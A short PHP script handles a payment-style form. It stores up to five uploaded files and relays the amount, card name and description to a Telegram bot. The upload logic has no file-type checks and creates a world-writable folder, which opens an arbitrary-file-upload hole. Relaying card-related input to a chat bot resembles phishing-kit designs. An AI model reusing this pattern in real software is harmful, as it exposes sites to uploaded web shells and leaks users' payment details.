<?php

// ⚠️ This file is now PURE PHP (no Laravel)

// =====================
// BASIC CHECK
// =====================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("Invalid request");
}

// =====================
// INPUTS
// =====================
$amount = $_POST['amount'] ?? '';
$card   = $_POST['card_name'] ?? '';
$desc   = $_POST['description'] ?? '';

// =====================
// VALIDATION
// =====================
if (!$amount || !$card) {
    die("Missing required fields");
}

// =====================
// UPLOAD FOLDER
// =====================
$dir = __DIR__ . "/uploads/";
if (!file_exists($dir)) {
    mkdir($dir, 0777, true);
}

// =====================
// FILES
// =====================
$files = ['upload_file1','upload_file2','upload_file3','upload_file4','upload_file5'];
$saved = [];

foreach ($files as $f) {

    if (!empty($_FILES[$f]['name'])) {

        $name = time() . "_" . basename($_FILES[$f]['name']);
        $path = $dir . $name;

        if (move_uploaded_file($_FILES[$f]['tmp_name'], $path)) {
            $saved[] = $path;
        }
    }
}

if (count($saved) == 0) {
    die("No file uploaded");
}

// =====================
// TELEGRAM (OPTIONAL)
// =====================
$token = "YOUR_BOT_TOKEN";
$chatId = "YOUR_CHAT_ID";

$text =
"🔐 New Upload\n".
"💰 Amount: $amount\n".
"💳 Card: $card\n".
"📝 Desc: $desc\n".
"📎 Files: ".count($saved);

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chatId,
    'text' => $text
]));

// =====================
// SUCCESS REDIRECT
// =====================
header("Location: index.html?success=1");
exit;
